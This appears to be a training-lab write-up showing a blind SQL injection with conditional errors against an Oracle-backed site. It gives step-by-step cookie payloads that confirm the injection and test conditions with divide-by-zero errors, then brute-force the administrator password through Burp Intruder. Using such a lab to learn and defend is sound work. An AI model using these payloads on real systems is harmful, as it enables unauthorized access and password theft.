# Lab: Blind SQL injection with conditional errors

Intercept a page and find the TrackingId cookie. Add a `'` to the end to see that an error is returned. Repeat with `''` and see that the error is resolved, indicating that a syntax error has an effect.

To confirm that the server is accepting SQL queries, submit `'||(select '')||'`, which results in error. Try again with `'||(select '' from dual)||'`, which does not error, indicating that the database is Oracle (Oracle requires a table be specified and 'dual' is guaranteed to exist).

Submit an invalid table name to receive an error: `'||(select '' from asdfsdf)||'`

This confirms that the input is being processed as SQL.

Next verify that the users table exists (no error): `'||(select '' from users where rownum = 1)||'`

The row condition is necessary to prevent the concatenation from breaking, as multiple results would be returned otherwise.

Modify the query to test conditions: 

`'||(select case when (1=1) then to_char(1/0) else '' end from dual)||'` (error)

`'||(select case when (1=2) then to_char(1/0) else '' end from dual)||'` (no error)

Check for a user in the table:
`'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'`


Now prep to brute-force the password:
`'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'`

Send the request to the intruder and select the cluster bomb attack type. Set the payloads as follows:
`'||(select case when SUBSTR(password,§1§,1)='§a§' then to_char(1/0) else '' end from users where username='administrator')||'`

Set payload 1 to use numbers 1-20 (guessing length based on last lab, but length checking is basically the same as in previous example with modifications for this context).

Set payload 2 to use a-z and 0-9. Start the attack. Filter out 2xx responses and sort by payload 1 to find the password: `stxyrxbn4m3elzf0ghnh`

Login as administrator to complete the lab.